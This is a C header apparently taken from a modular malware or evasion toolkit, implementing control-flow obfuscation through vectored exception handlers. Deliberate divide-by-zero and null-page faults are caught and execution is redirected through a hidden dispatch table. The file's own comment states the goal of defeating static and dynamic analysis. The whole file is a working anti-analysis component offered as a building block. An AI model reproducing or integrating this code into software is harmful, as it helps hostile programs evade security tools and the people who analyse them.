// chunk: evasion/seh_control_flow
// depends: (none)
// provides: seh_cf_init
// headers: windows.h
// risk: none
// note: SEH-based control flow obfuscation — uses structured exception handlers to
//       redirect execution flow. Instead of direct function calls, triggers controlled
//       exceptions that SEH handlers catch and redirect to the target code. Makes
//       control flow analysis difficult for both static and dynamic analyzers.

#ifndef CHUNK_SEH_CONTROL_FLOW
#define CHUNK_SEH_CONTROL_FLOW

#include <windows.h>

typedef void (*seh_target_fn)(void);

static seh_target_fn _seh_dispatch_table[16];
static int _seh_dispatch_count = 0;

static LONG CALLBACK _seh_cf_handler(PEXCEPTION_POINTERS info) {
    if (info->ExceptionRecord->ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) {
        /* Decode the dispatch index from RCX (set before the div-by-zero) */
        DWORD64 idx = info->ContextRecord->Rcx;
        if (idx < (DWORD64)_seh_dispatch_count && _seh_dispatch_table[idx]) {
            /* Skip past the dividing instruction and redirect to target */
            info->ContextRecord->Rip = (DWORD64)_seh_dispatch_table[idx];
            info->ContextRecord->Rax = 1; /* prevent re-trigger */
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    if (info->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        /* Access violation on NULL page = dispatch via address encoding */
        DWORD64 fault = (DWORD64)info->ExceptionRecord->ExceptionInformation[1];
        if (fault < 16 && fault < (DWORD64)_seh_dispatch_count) {
            info->ContextRecord->Rip = (DWORD64)_seh_dispatch_table[fault];
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static void seh_cf_register(seh_target_fn fn) {
    if (_seh_dispatch_count < 16) {
        _seh_dispatch_table[_seh_dispatch_count++] = fn;
    }
}

static void seh_cf_init(void) {
    AddVectoredExceptionHandler(1, _seh_cf_handler);
}

#endif
